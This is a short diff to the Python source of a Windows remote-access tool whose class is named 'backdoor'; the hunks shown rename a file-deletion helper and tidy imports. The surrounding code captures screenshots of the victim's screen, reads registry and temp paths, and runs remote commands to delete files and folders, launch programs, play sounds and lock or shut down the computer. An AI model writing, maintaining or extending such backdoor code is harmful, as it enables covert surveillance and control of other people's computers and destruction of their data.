@@ -1,5 +1,4 @@
 import os
-import re
 import sys
 import time
 import json
@@ -12,7 +11,7 @@ from winreg import *
 import work_manager as wm
 from PIL import ImageGrab
 from shutil import copyfile
- 
+
 class backdoor:
     PATH = os.path.realpath(sys.argv[0])
     TMP = os.environ["TEMP"]
@@ -167,7 +166,7 @@ class backdoor:
             screenshot.save(path)
             data = self.read_file(path)
 
-            self.work_manager.delete_file(path)
+            self.work_manager.delete_path(path)
             return data
         except Exception as e:
             return "[-] Error getting screenshot data: {}.".format(e)
@@ -262,7 +261,7 @@ class backdoor:
                     elif command_0 == "psound":     #Stop sound
                         command_result = self.work_manager.play_sound(rest_of_command, False)
                     elif command_0 == "del":    #Delete file\folder
-                        command_result = self.work_manager.delete_file(rest_of_command)
+                        command_result = self.work_manager.delete_path(rest_of_command)
                     elif command_0 == "launch":     #Launch file\folder
                         command_0 = self.work_manager.launch_file(rest_of_command)
                     elif command_0 == "cgstate":    #Change state of computer(lock, shutdown)
